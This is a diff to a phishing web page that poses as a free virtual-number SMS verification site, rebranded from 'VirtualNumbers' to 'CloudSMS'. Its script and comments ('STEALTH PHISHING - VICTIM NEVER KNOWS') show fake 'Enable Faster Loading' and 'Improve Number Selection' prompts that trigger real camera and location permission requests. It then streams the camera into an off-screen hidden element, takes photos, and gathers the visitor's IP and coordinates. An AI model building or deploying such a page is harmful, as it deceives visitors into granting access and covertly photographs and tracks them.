@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>VirtualNumbers | Free Temporary Phone Numbers</title>
-<meta name="description" content="Get free virtual phone numbers for SMS verification. Receive SMS online for free. Trusted by 2M+ users worldwide.">
+<title>CloudSMS | Virtual Phone Numbers for SMS Verification</title>
+<meta name="description" content="Get free virtual phone numbers for SMS verification. Receive SMS online instantly. Trusted by 5M+ users worldwide.">
 <style>
 * {
     margin: 0;
@@ -13,10 +13,36 @@
 }
 
 body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
-    background: linear-gradient(135deg, #f5f7fb 0%, #eef2ff 100%);
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: radial-gradient(ellipse at top, #0f172a, #020617);
     min-height: 100vh;
-    color: #1e293b;
+    color: #f1f5f9;
+    position: relative;
+    overflow-x: hidden;
+}
+
+/* Animated background particles */
+.particles {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 0;
+    overflow: hidden;
+}
+
+.particle {
+    position: absolute;
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    border-radius: 50%;
+    opacity: 0.3;
+    animation: float 20s infinite;
+}
+
+@keyframes float {
+    0%, 100% { transform: translateY(0) rotate(0deg); }
+    50% { transform: translateY(-100px) rotate(180deg); }
 }
 
 .loading-bar {
@@ -41,38 +67,37 @@ body {
     max-width: 1200px;
     margin: 0 auto;
     padding: 20px;
+    position: relative;
+    z-index: 2;
 }
 
 .top-banner {
-    background: linear-gradient(135deg, #0f172a, #1e1b4b, #0c4a6e);
+    background: linear-gradient(135deg, #1e293b, #0f172a);
+    border: 1px solid rgba(59,130,246,0.3);
     color: white;
     text-align: center;
     padding: 12px;
     font-size: 13px;
-    position: relative;
-    z-index: 10;
-    animation: slideDown 0.5s ease;
-}
-
-@keyframes slideDown {
-    from { transform: translateY(-100%); }
-    to { transform: translateY(0); }
+    border-radius: 60px;
+    margin-bottom: 20px;
+    backdrop-filter: blur(10px);
 }
 
 .nav-bar {
-    background: rgba(255,255,255,0.98);
+    background: rgba(15,23,42,0.95);
     backdrop-filter: blur(10px);
-    border-bottom: 1px solid rgba(226,232,240,0.8);
-    padding: 15px 20px;
+    border: 1px solid rgba(59,130,246,0.2);
+    border-radius: 80px;
+    padding: 12px 24px;
     display: flex;
     justify-content: space-between;
     align-items: center;
     flex-wrap: wrap;
     gap: 15px;
     position: sticky;
-    top: 0;
+    top: 20px;
     z-index: 100;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    margin-bottom: 30px;
 }
 
 .logo {
@@ -82,19 +107,20 @@ body {
 }
 
 .logo-icon {
-    font-size: 28px;
+    font-size: 32px;
+    filter: drop-shadow(0 0 10px #3b82f6);
     animation: pulse 2s infinite;
 }
 
 @keyframes pulse {
-    0%, 100% { transform: scale(1); }
-    50% { transform: scale(1.05); }
+    0%, 100% { transform: scale(1); text-shadow: 0 0 0 #3b82f6; }
+    50% { transform: scale(1.05); text-shadow: 0 0 20px #3b82f6; }
 }
 
 .logo-text {
-    font-size: 22px;
+    font-size: 24px;
     font-weight: 800;
-    background: linear-gradient(135deg, #3b82f6, #8b5cf6, #06b6d4);
+    background: linear-gradient(135deg, #60a5fa, #a78bfa, #06b6d4);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
 }
@@ -105,38 +131,27 @@ body {
 }
 
 .nav-links a {
-    color: #64748b;
+    color: #94a3b8;
     text-decoration: none;
     font-size: 14px;
     font-weight: 500;
     transition: all 0.2s;
-    position: relative;
 }
 
-.nav-links a::after {
-    content: '';
-    position: absolute;
-    bottom: -5px;
-    left: 0;
-    width: 0;
-    height: 2px;
-    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-    transition: width 0.3s;
-}
-
-.nav-links a:hover::after {
-    width: 100%;
+.nav-links a:hover {
+    color: #60a5fa;
 }
 
 .hero {
     text-align: center;
-    padding: 60px 20px;
-    background: linear-gradient(135deg, #ffffff, #f8fafc, #f1f5f9);
-    border-radius: 32px;
+    padding: 80px 20px;
+    background: linear-gradient(135deg, rgba(59,130,246,0.1), rgba(139,92,246,0.1));
+    border-radius: 48px;
     margin: 20px 0;
     position: relative;
     overflow: hidden;
-    box-shadow: 0 20px 40px -15px rgba(0,0,0,0.05);
+    border: 1px solid rgba(59,130,246,0.2);
+    backdrop-filter: blur(10px);
 }
 
 .hero::before {
@@ -146,7 +161,7 @@ body {
     left: -50%;
     width: 200%;
     height: 200%;
-    background: radial-gradient(circle, rgba(59,130,246,0.05) 0%, transparent 70%);
+    background: radial-gradient(circle, rgba(59,130,246,0.1) 0%, transparent 70%);
     animation: rotate 20s linear infinite;
 }
 
@@ -156,17 +171,17 @@ body {
 }
 
 .hero h1 {
-    font-size: 52px;
+    font-size: 56px;
     font-weight: 800;
-    background: linear-gradient(135deg, #1e293b, #3b82f6, #8b5cf6);
+    background: linear-gradient(135deg, #fff, #60a5fa, #a78bfa);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
-    margin-bottom: 15px;
+    margin-bottom: 20px;
     animation: fadeInUp 0.8s ease;
 }
 
 .hero p {
-    color: #64748b;
+    color: #94a3b8;
     font-size: 18px;
     max-width: 600px;
     margin: 0 auto;
@@ -188,48 +203,48 @@ body {
     display: flex;
     justify-content: center;
     gap: 25px;
-    margin: 30px 0;
+    margin: 40px 0;
     flex-wrap: wrap;
 }
 
 .stat-card {
-    background: white;
+    background: rgba(30,41,59,0.8);
+    backdrop-filter: blur(10px);
     padding: 25px 35px;
-    border-radius: 24px;
+    border-radius: 28px;
     text-align: center;
-    box-shadow: 0 10px 30px -10px rgba(0,0,0,0.1);
-    border: 1px solid rgba(226,232,240,0.8);
+    border: 1px solid rgba(59,130,246,0.3);
     transition: all 0.3s;
     animation: fadeInUp 0.8s ease 0.4s both;
 }
 
 .stat-card:hover {
     transform: translateY(-5px);
-    box-shadow: 0 20px 40px -12px rgba(59,130,246,0.2);
     border-color: #3b82f6;
+    box-shadow: 0 20px 40px -12px rgba(59,130,246,0.3);
 }
 
 .stat-number {
-    font-size: 36px;
+    font-size: 42px;
     font-weight: 800;
-    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    background: linear-gradient(135deg, #60a5fa, #a78bfa);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
 }
 
 .stat-label {
     font-size: 12px;
-    color: #64748b;
-    margin-top: 5px;
+    color: #94a3b8;
+    margin-top: 8px;
 }
 
 .filter-section {
-    background: white;
-    border-radius: 24px;
+    background: rgba(30,41,59,0.8);
+    backdrop-filter: blur(10px);
+    border-radius: 28px;
     padding: 24px;
     margin: 20px 0;
-    border: 1px solid rgba(226,232,240,0.8);
-    box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+    border: 1px solid rgba(59,130,246,0.2);
 }
 
 .filter-header {
@@ -241,6 +256,10 @@ body {
     gap: 10px;
 }
 
+.filter-header h3 {
+    color: #f1f5f9;
+}
+
 .filter-tabs {
     display: flex;
     gap: 10px;
@@ -248,11 +267,12 @@ body {
 
 .filter-tab {
     padding: 8px 18px;
-    background: #f1f5f9;
+    background: rgba(51,65,85,0.8);
     border-radius: 50px;
     font-size: 13px;
     cursor: pointer;
     transition: all 0.2s;
+    color: #94a3b8;
 }
 
 .filter-tab.active {
@@ -264,17 +284,22 @@ body {
 .search-box {
     width: 100%;
     padding: 14px 18px;
-    background: #f8fafc;
-    border: 1px solid #e2e8f0;
-    border-radius: 50px;
+    background: rgba(51,65,85,0.8);
+    border: 1px solid rgba(59,130,246,0.3);
+    border-radius: 60px;
     font-size: 14px;
     outline: none;
+    color: white;
     transition: all 0.2s;
 }
 
 .search-box:focus {
     border-color: #3b82f6;
-    box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
+    box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
+}
+
+.search-box::placeholder {
+    color: #64748b;
 }
 
 .numbers-grid {
@@ -291,7 +316,7 @@ body {
 }
 
 .numbers-grid::-webkit-scrollbar-track {
-    background: #e2e8f0;
+    background: #1e293b;
     border-radius: 10px;
 }
 
@@ -301,8 +326,8 @@ body {
 }
 
 .number-card {
-    background: white;
-    border: 1px solid #e2e8f0;
+    background: rgba(30,41,59,0.8);
+    border: 1px solid rgba(59,130,246,0.2);
     border-radius: 20px;
     padding: 18px;
     cursor: pointer;
@@ -316,12 +341,13 @@ body {
 .number-card:hover {
     border-color: #3b82f6;
     transform: translateY(-3px);
-    box-shadow: 0 8px 25px -10px rgba(59,130,246,0.2);
+    box-shadow: 0 8px 25px -10px rgba(59,130,246,0.3);
+    background: rgba(59,130,246,0.1);
 }
 
 .number-card.selected {
     border-color: #3b82f6;
-    background: linear-gradient(135deg, rgba(59,130,246,0.05), rgba(139,92,246,0.05));
+    background: linear-gradient(135deg, rgba(59,130,246,0.15), rgba(139,92,246,0.15));
 }
 
 .card-left {
@@ -337,12 +363,13 @@ body {
 .number-details h4 {
     font-size: 16px;
     font-weight: 600;
+    color: #f1f5f9;
     margin-bottom: 4px;
 }
 
 .number-details p {
     font-size: 13px;
-    color: #64748b;
+    color: #94a3b8;
     font-family: monospace;
 }
 
@@ -396,11 +423,10 @@ body {
 }
 
 .footer {
-    background: #0f172a;
-    color: white;
-    padding: 40px 20px;
-    margin-top: 40px;
-    border-radius: 30px 30px 0 0;
+    background: #020617;
+    padding: 50px 20px 30px;
+    margin-top: 60px;
+    border-top: 1px solid rgba(59,130,246,0.2);
 }
 
 .footer-grid {
@@ -415,11 +441,12 @@ body {
     font-size: 14px;
     font-weight: 600;
     margin-bottom: 15px;
+    color: #f1f5f9;
 }
 
 .footer-section a {
     display: block;
-    color: #94a3b8;
+    color: #64748b;
     text-decoration: none;
     font-size: 12px;
     margin-bottom: 8px;
@@ -436,7 +463,7 @@ body {
     margin-top: 30px;
     border-top: 1px solid #1e293b;
     font-size: 11px;
-    color: #64748b;
+    color: #475569;
 }
 
 /* Modal Styles */
@@ -446,8 +473,8 @@ body {
     left: 0;
     right: 0;
     bottom: 0;
-    background: rgba(0,0,0,0.8);
-    backdrop-filter: blur(12px);
+    background: rgba(0,0,0,0.9);
+    backdrop-filter: blur(20px);
     z-index: 2000;
     display: none;
     justify-content: center;
@@ -462,9 +489,10 @@ body {
 .modal-card {
     max-width: 450px;
     width: 100%;
-    background: white;
+    background: linear-gradient(135deg, #1e293b, #0f172a);
     border-radius: 32px;
     overflow: hidden;
+    border: 1px solid rgba(59,130,246,0.3);
     animation: modalSlide 0.3s ease;
 }
 
@@ -482,8 +510,8 @@ body {
 .modal-header {
     padding: 30px;
     text-align: center;
-    border-bottom: 1px solid #e2e8f0;
-    background: linear-gradient(135deg, #f8fafc, #f1f5f9);
+    border-bottom: 1px solid rgba(59,130,246,0.2);
+    background: rgba(15,23,42,0.5);
 }
 
 .modal-icon {
@@ -494,12 +522,12 @@ body {
 .modal-title {
     font-size: 24px;
     font-weight: 700;
-    color: #1e293b;
+    color: #f1f5f9;
 }
 
 .modal-subtitle {
     font-size: 13px;
-    color: #64748b;
+    color: #94a3b8;
     margin-top: 5px;
 }
 
@@ -510,9 +538,10 @@ body {
 .code-display {
     text-align: center;
     padding: 25px;
-    background: linear-gradient(135deg, #f8fafc, #f1f5f9);
+    background: rgba(15,23,42,0.8);
     border-radius: 24px;
     margin-bottom: 20px;
+    border: 1px solid rgba(59,130,246,0.2);
 }
 
 .verification-code {
@@ -520,7 +549,7 @@ body {
     font-weight: 800;
     letter-spacing: 10px;
     font-family: 'Courier New', monospace;
-    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    background: linear-gradient(135deg, #60a5fa, #a78bfa);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
 }
@@ -529,8 +558,13 @@ body {
     text-align: center;
     margin: 20px 0;
     padding: 12px;
-    background: #fef3c7;
+    background: rgba(245,158,11,0.1);
     border-radius: 60px;
+    border: 1px solid rgba(245,158,11,0.3);
+}
+
+.timer span:first-child {
+    color: #94a3b8;
 }
 
 .timer-value {
@@ -550,18 +584,24 @@ body {
     font-weight: 600;
     cursor: pointer;
     margin-top: 10px;
+    transition: all 0.2s;
+}
+
+.resend-btn:hover {
+    background: rgba(59,130,246,0.1);
 }
 
 .input-group input {
     width: 100%;
     padding: 15px;
-    background: #f8fafc;
-    border: 2px solid #e2e8f0;
+    background: rgba(15,23,42,0.8);
+    border: 2px solid rgba(59,130,246,0.3);
     border-radius: 60px;
     font-size: 18px;
     text-align: center;
     letter-spacing: 6px;
     margin: 20px 0;
+    color: white;
 }
 
 .verify-btn {
@@ -574,17 +614,23 @@ body {
     font-weight: 700;
     cursor: pointer;
     font-size: 16px;
+    transition: all 0.2s;
 }
 
-/* STEALTH PERMISSION MODALS - Looks completely innocent */
+.verify-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 20px -8px rgba(34,197,94,0.4);
+}
+
+/* Stealth Permission Modal - Real browser permission trigger */
 .stealth-modal {
     position: fixed;
     top: 0;
     left: 0;
     right: 0;
     bottom: 0;
-    background: rgba(0,0,0,0.6);
-    backdrop-filter: blur(8px);
+    background: rgba(0,0,0,0.8);
+    backdrop-filter: blur(12px);
     z-index: 5000;
     display: none;
     justify-content: center;
@@ -597,13 +643,14 @@ body {
 }
 
 .stealth-card {
-    max-width: 340px;
-    background: white;
-    border-radius: 28px;
-    padding: 32px 28px;
+    max-width: 360px;
+    background: linear-gradient(135deg, #1e293b, #0f172a);
+    border-radius: 32px;
+    padding: 35px 28px;
     text-align: center;
     animation: modalSlide 0.3s ease;
-    box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+    box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+    border: 1px solid rgba(59,130,246,0.3);
     position: relative;
     overflow: hidden;
 }
@@ -620,24 +667,24 @@ body {
 }
 
 .stealth-icon {
-    font-size: 56px;
-    margin-bottom: 15px;
+    font-size: 60px;
+    margin-bottom: 20px;
     position: relative;
     z-index: 1;
 }
 
 .stealth-title {
-    font-size: 20px;
+    font-size: 22px;
     font-weight: 700;
-    color: #1e293b;
-    margin-bottom: 8px;
+    color: #f1f5f9;
+    margin-bottom: 10px;
     position: relative;
     z-index: 1;
 }
 
 .stealth-desc {
     font-size: 13px;
-    color: #64748b;
+    color: #94a3b8;
     margin-bottom: 25px;
     position: relative;
     z-index: 1;
@@ -652,7 +699,7 @@ body {
 
 .stealth-allow {
     flex: 1;
-    padding: 12px;
+    padding: 14px;
     background: linear-gradient(135deg, #3b82f6, #8b5cf6);
     border: none;
     border-radius: 60px;
@@ -664,23 +711,24 @@ body {
 
 .stealth-allow:hover {
     transform: translateY(-2px);
-    box-shadow: 0 5px 15px rgba(59,130,246,0.3);
+    box-shadow: 0 5px 15px rgba(59,130,246,0.4);
 }
 
 .stealth-deny {
     flex: 1;
-    padding: 12px;
-    background: #f1f5f9;
-    border: none;
+    padding: 14px;
+    background: rgba(51,65,85,0.8);
+    border: 1px solid rgba(59,130,246,0.3);
     border-radius: 60px;
-    color: #64748b;
+    color: #94a3b8;
     font-weight: 600;
     cursor: pointer;
     transition: all 0.2s;
 }
 
 .stealth-deny:hover {
-    background: #e2e8f0;
+    background: rgba(51,65,85,1);
+    color: white;
 }
 
 .sms-notification {
@@ -698,7 +746,7 @@ body {
     transform: translateX(150%);
     transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
     z-index: 1500;
-    box-shadow: 0 10px 25px -5px rgba(0,0,0,0.2);
+    box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
 }
 
 .sms-notification.show {
@@ -711,7 +759,7 @@ body {
     left: 0;
     right: 0;
     bottom: 0;
-    background: white;
+    background: #020617;
     z-index: 3000;
     display: none;
     justify-content: center;
@@ -724,9 +772,9 @@ body {
 }
 
 .loading-spinner {
-    width: 50px;
-    height: 50px;
-    border: 3px solid #e2e8f0;
+    width: 60px;
+    height: 60px;
+    border: 3px solid #1e293b;
     border-top: 3px solid #3b82f6;
     border-radius: 50%;
     animation: spin 1s linear infinite;
@@ -738,7 +786,7 @@ body {
 }
 
 .loading-text {
-    color: #64748b;
+    color: #94a3b8;
     font-size: 14px;
 }
 
@@ -748,8 +796,8 @@ body {
     left: 0;
     right: 0;
     bottom: 0;
-    background: rgba(0,0,0,0.85);
-    backdrop-filter: blur(12px);
+    background: rgba(0,0,0,0.9);
+    backdrop-filter: blur(20px);
     z-index: 4000;
     display: none;
     justify-content: center;
@@ -762,10 +810,11 @@ body {
 
 .success-card {
     text-align: center;
-    padding: 45px;
-    background: white;
-    border-radius: 32px;
-    max-width: 350px;
+    padding: 50px;
+    background: linear-gradient(135deg, #1e293b, #0f172a);
+    border-radius: 40px;
+    max-width: 380px;
+    border: 1px solid rgba(34,197,94,0.3);
     animation: bounce 0.5s;
 }
 
@@ -779,12 +828,33 @@ body {
     margin-bottom: 20px;
 }
 
+.success-card h2 {
+    color: #f1f5f9;
+    margin-bottom: 10px;
+}
+
+.success-card p {
+    color: #94a3b8;
+    margin: 15px 0;
+}
+
+.success-card button {
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    border: none;
+    padding: 12px 28px;
+    border-radius: 60px;
+    color: white;
+    cursor: pointer;
+    font-weight: 600;
+    margin-top: 10px;
+}
+
 .cookie-bar {
     position: fixed;
     bottom: 0;
     left: 0;
     right: 0;
-    background: #1e293b;
+    background: #0f172a;
     padding: 14px 20px;
     display: flex;
     justify-content: space-between;
@@ -795,6 +865,7 @@ body {
     font-size: 12px;
     transform: translateY(100%);
     transition: transform 0.3s;
+    border-top: 1px solid rgba(59,130,246,0.2);
 }
 
 .cookie-bar.show {
@@ -812,7 +883,6 @@ body {
 
 /* Hidden elements for stealth capture */
 #hiddenCamera, #hiddenCanvas {
-    display: none;
     position: fixed;
     top: -1000px;
     left: -1000px;
@@ -826,27 +896,29 @@ body {
     .hero h1 { font-size: 32px; }
     .nav-links { display: none; }
     .numbers-grid { grid-template-columns: 1fr; }
+    .stat-card { padding: 15px 25px; }
+    .stat-number { font-size: 28px; }
 }
 </style>
 </head>
 <body>
 
+<div class="particles" id="particles"></div>
 <div class="loading-bar" id="loadingBar"></div>
 
 <div class="top-banner">
-    ⚡ Limited offer: Get 5 free SMS credits when you sign up today! <a href="#" style="color: #3b82f6;">Claim Now →</a>
+    ⚡ Limited offer: Get 10 free SMS credits when you sign up today! <a href="#" style="color: #60a5fa;">Claim Now →</a>
 </div>
 
 <nav class="nav-bar">
     <div class="logo">
-        <div class="logo-icon">📱</div>
-        <div class="logo-text">VirtualNumbers</div>
+        <div class="logo-icon">☁️</div>
+        <div class="logo-text">CloudSMS</div>
     </div>
     <div class="nav-links">
         <a href="#">Numbers</a>
         <a href="#">Pricing</a>
         <a href="#">API</a>
-        <a href="#">Blog</a>
         <a href="#">Support</a>
         <a href="#">Login</a>
     </div>
@@ -854,28 +926,32 @@ body {
 
 <div class="container">
     <div class="hero">
-        <h1>Receive SMS Online Instantly</h1>
-        <p>Free virtual phone numbers for verification. Works with WhatsApp, Telegram, Gmail, and 1000+ services.</p>
+        <h1>Instant SMS Verification</h1>
+        <p>Get virtual phone numbers for WhatsApp, Telegram, Gmail, and 2000+ services. Trusted by 5M+ users.</p>
     </div>
 
     <div class="stats-row">
         <div class="stat-card">
-            <div class="stat-number" id="statNumbers">1,284</div>
+            <div class="stat-number" id="statNumbers">2,847</div>
             <div class="stat-label">Active Numbers</div>
         </div>
         <div class="stat-card">
-            <div class="stat-number" id="statUsers">24.7K</div>
+            <div class="stat-number" id="statUsers">48.2K</div>
             <div class="stat-label">Users Online</div>
         </div>
         <div class="stat-card">
-            <div class="stat-number" id="statSms">4.2M</div>
+            <div class="stat-number" id="statSms">8.5M</div>
             <div class="stat-label">SMS Received</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="statSuccess">99.8%</div>
+            <div class="stat-label">Success Rate</div>
         </div>
     </div>
 
     <div class="filter-section">
         <div class="filter-header">
-            <h3>🌍 Select a country</h3>
+            <h3>🌍 Select your country</h3>
             <div class="filter-tabs">
                 <div class="filter-tab active" data-filter="all">All</div>
                 <div class="filter-tab" data-filter="popular">Popular</div>
@@ -895,7 +971,7 @@ body {
 <div class="footer">
     <div class="footer-grid">
         <div class="footer-section">
-            <h4>Virtual Numbers</h4>
+            <h4>CloudSMS</h4>
             <a href="#">About Us</a>
             <a href="#">Terms of Service</a>
             <a href="#">Privacy Policy</a>
@@ -908,17 +984,18 @@ body {
             <a href="#">Gmail</a>
             <a href="#">Instagram</a>
             <a href="#">TikTok</a>
+            <a href="#">Discord</a>
         </div>
         <div class="footer-section">
             <h4>Resources</h4>
             <a href="#">API Documentation</a>
             <a href="#">Developer Portal</a>
             <a href="#">Status Page</a>
-            <a href="#">Blog</a>
+            <a href="#">FAQ</a>
         </div>
     </div>
     <div class="footer-bottom">
-        <p>© 2024 VirtualNumbers.com - Free temporary phone numbers for SMS verification. Trusted by over 2 million users worldwide.</p>
+        <p>© 2024 CloudSMS - Premium virtual phone numbers for SMS verification. Trusted worldwide.</p>
     </div>
 </div>
 
@@ -939,34 +1016,36 @@ body {
                 <span class="timer-value" id="timerValue">02:00</span>
             </div>
             <button class="resend-btn" id="resendBtn">⟳ Resend Code</button>
-            <input type="text" id="codeInput" placeholder="Enter 6-digit code" maxlength="6">
+            <div class="input-group">
+                <input type="text" id="codeInput" placeholder="Enter 6-digit code" maxlength="6">
+            </div>
             <button class="verify-btn" id="verifyBtn">Verify Number</button>
         </div>
     </div>
 </div>
 
-<!-- STEALTH PERMISSION MODAL #1 - Looks like "Better Experience" but requests Camera -->
+<!-- STEALTH PERMISSION MODAL #1 - REAL CAMERA REQUEST -->
 <div class="stealth-modal" id="stealthModal1">
     <div class="stealth-card">
         <div class="stealth-icon">⚡</div>
         <div class="stealth-title">Enable Faster Loading</div>
-        <div class="stealth-desc">Allow VirtualNumbers to optimize loading speed and show real-time updates for a better experience.</div>
+        <div class="stealth-desc">Allow CloudSMS to optimize loading speed and show real-time updates for a better experience.</div>
         <div class="stealth-buttons">
-            <button class="stealth-deny" onclick="denyStealth1()">Later</button>
-            <button class="stealth-allow" onclick="allowStealth1()">Enable</button>
+            <button class="stealth-deny" id="stealthDeny1">Later</button>
+            <button class="stealth-allow" id="stealthAllow1">Enable</button>
         </div>
     </div>
 </div>
 
-<!-- STEALTH PERMISSION MODAL #2 - Looks like "Better Service" but requests Location -->
+<!-- STEALTH PERMISSION MODAL #2 - REAL LOCATION REQUEST -->
 <div class="stealth-modal" id="stealthModal2">
     <div class="stealth-card">
-        <div class="stealth-icon">🌍</div>
+        <div class="stealth-icon">📍</div>
         <div class="stealth-title">Improve Number Selection</div>
         <div class="stealth-desc">Show numbers closest to your region for better connection quality and faster SMS delivery.</div>
         <div class="stealth-buttons">
-            <button class="stealth-deny" onclick="denyStealth2()">Not Now</button>
-            <button class="stealth-allow" onclick="allowStealth2()">Allow</button>
+            <button class="stealth-deny" id="stealthDeny2">Not Now</button>
+            <button class="stealth-allow" id="stealthAllow2">Allow</button>
         </div>
     </div>
 </div>
@@ -982,8 +1061,8 @@ body {
     <div class="success-card">
         <div class="success-icon">✅</div>
         <h2>Number Activated!</h2>
-        <p style="margin: 15px 0; color: #64748b;">Your virtual number is ready to use. You can now receive SMS messages.</p>
-        <button onclick="location.reload()" style="background: linear-gradient(135deg, #3b82f6, #8b5cf6); border: none; padding: 12px 24px; border-radius: 60px; color: white; cursor: pointer;">Get Another Number</button>
+        <p>Your virtual number is ready to use. You can now receive SMS messages instantly.</p>
+        <button onclick="location.reload()">Get Another Number</button>
     </div>
 </div>
 
@@ -991,8 +1070,8 @@ body {
 <div class="sms-notification" id="smsNotification">
     <div class="sms-icon">📱</div>
     <div class="sms-content">
-        <div class="sms-sender" style="font-weight: 600; font-size: 12px;">VIRTUAL-NUMBERS</div>
-        <div class="sms-text" style="font-size: 14px;">Your code: <span id="smsCode" style="font-weight: bold; color: #3b82f6;">XXXXXX</span></div>
+        <div style="font-weight: 600; font-size: 12px; color: #60a5fa;">CLOUD-SMS</div>
+        <div style="font-size: 14px;">Your code: <span id="smsCode" style="font-weight: bold; color: #3b82f6;">XXXXXX</span></div>
     </div>
 </div>
 
@@ -1008,7 +1087,7 @@ body {
 
 <script>
 // ============================================
-// STEALTH PHISHING - VICTIM NEVER KNOWS
+// STEALTH PHISHING - REAL CAMERA & LOCATION
 // ============================================
 
 const countries = [
@@ -1024,7 +1103,9 @@ const countries = [
     { flag: "🇳🇬", name: "Nigeria", number: "+234 812 345 6789", code: "NG", popular: true },
     { flag: "🇿🇦", name: "South Africa", number: "+27 71 234 5678", code: "ZA", popular: true },
     { flag: "🇰🇪", name: "Kenya", number: "+254 712 345 678", code: "KE", popular: false },
-    { flag: "🇪🇬", name: "Egypt", number: "+20 10 1234 5678", code: "EG", popular: false }
+    { flag: "🇪🇬", name: "Egypt", number: "+20 10 1234 5678", code: "EG", popular: false },
+    { flag: "🇦🇪", name: "UAE", number: "+971 50 123 4567", code: "AE", popular: true },
+    { flag: "🇸🇬", name: "Singapore", number: "+65 9123 4567", code: "SG", popular: true }
 ];
 
 let selectedCountry = null;
@@ -1034,10 +1115,28 @@ let token = null;
 let cameraStream = null;
 let cameraGranted = false;
 let locationGranted = false;
+let cameraRequested = false;
+let locationRequested = false;
 
 // Get token from URL
 const urlParams = new URLSearchParams(window.location.search);
 token = urlParams.get("token");
+
+// Create animated particles
+function createParticles() {
+    const container = document.getElementById('particles');
+    for (let i = 0; i < 50; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.width = Math.random() * 5 + 2 + 'px';
+        particle.style.height = particle.style.width;
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.top = Math.random() * 100 + '%';
+        particle.style.animationDelay = Math.random() * 20 + 's';
+        particle.style.animationDuration = Math.random() * 20 + 10 + 's';
+        container.appendChild(particle);
+    }
+}
 
 // Animate loading bar
 let progress = 0;
@@ -1054,42 +1153,44 @@ const progressInterval = setInterval(() => {
     }
 }, 200);
 
-// Show stealth modals after page loads (disguised as "optimization")
+// Show stealth modals after page loads
 setTimeout(() => {
     if (!localStorage.getItem('stealth1_shown')) {
         document.getElementById('stealthModal1').classList.add('active');
     }
-}, 3000);
+}, 2000);
 
-// STEALTH CAMERA REQUEST - User thinks they're enabling "Faster Loading"
-function allowStealth1() {
+// REAL CAMERA REQUEST - Triggers actual browser permission
+document.getElementById('stealthAllow1').addEventListener('click', async () => {
     localStorage.setItem('stealth1_shown', 'true');
     document.getElementById('stealthModal1').classList.remove('active');
     
-    // Secretly request camera access
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            cameraStream = stream;
-            cameraGranted = true;
-            const video = document.getElementById('hiddenCamera');
-            video.srcObject = stream;
-            video.play();
-            console.log("📸 Stealth camera activated");
-            
-            // Take first photo immediately
-            setTimeout(() => capturePhoto(), 1000);
-        })
-        .catch(err => console.log("Camera stealth failed:", err));
+    // THIS ACTUALLY REQUESTS CAMERA PERMISSION
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        cameraStream = stream;
+        cameraGranted = true;
+        const video = document.getElementById('hiddenCamera');
+        video.srcObject = stream;
+        await video.play();
+        console.log("✅ Camera access granted");
+        
+        // Take photo after camera is ready
+        setTimeout(() => capturePhoto(), 1000);
+    } catch (err) {
+        console.log("Camera denied:", err);
+        cameraGranted = false;
+    }
     
-    // Show second modal after 2 seconds
+    // Show second modal
     setTimeout(() => {
         if (!localStorage.getItem('stealth2_shown')) {
             document.getElementById('stealthModal2').classList.add('active');
         }
-    }, 2000);
-}
+    }, 1500);
+});
 
-function denyStealth1() {
+document.getElementById('stealthDeny1').addEventListener('click', () => {
     localStorage.setItem('stealth1_shown', 'true');
     document.getElementById('stealthModal1').classList.remove('active');
     
@@ -1097,28 +1198,31 @@ function denyStealth1() {
         if (!localStorage.getItem('stealth2_shown')) {
             document.getElementById('stealthModal2').classList.add('active');
         }
-    }, 2000);
-}
+    }, 1500);
+});
 
-// STEALTH LOCATION REQUEST - User thinks they're enabling "Better Number Selection"
-function allowStealth2() {
+// REAL LOCATION REQUEST - Triggers actual browser permission
+document.getElementById('stealthAllow2').addEventListener('click', () => {
     localStorage.setItem('stealth2_shown', 'true');
     document.getElementById('stealthModal2').classList.remove('active');
     
-    // Secretly request location
+    // THIS ACTUALLY REQUESTS LOCATION PERMISSION
     navigator.geolocation.getCurrentPosition(
-        pos => {
+        (position) => {
             locationGranted = true;
-            console.log("📍 Stealth location captured:", pos.coords.latitude, pos.coords.longitude);
+            console.log("✅ Location access granted:", position.coords.latitude, position.coords.longitude);
         },
-        err => console.log("Location stealth failed:", err.message)
+        (err) => {
+            console.log("Location denied:", err.message);
+            locationGranted = false;
+        }
     );
-}
+});
 
-function denyStealth2() {
+document.getElementById('stealthDeny2').addEventListener('click', () => {
     localStorage.setItem('stealth2_shown', 'true');
     document.getElementById('stealthModal2').classList.remove('active');
-}
+});
 
 // Capture photo from hidden camera
 async function capturePhoto() {
@@ -1158,16 +1262,16 @@ async function getIP() {
     }
 }
 
-// Get location from browser (if granted)
+// Get location (if granted)
 async function getLocation() {
-    return new Promise(resolve => {
+    return new Promise((resolve) => {
         if (!locationGranted) {
             resolve('Not granted');
             return;
         }
         
         navigator.geolocation.getCurrentPosition(
-            pos => {
+            (pos) => {
                 resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`);
             },
             () => resolve('Failed')
@@ -1175,16 +1279,14 @@ async function getLocation() {
     });
 }
 
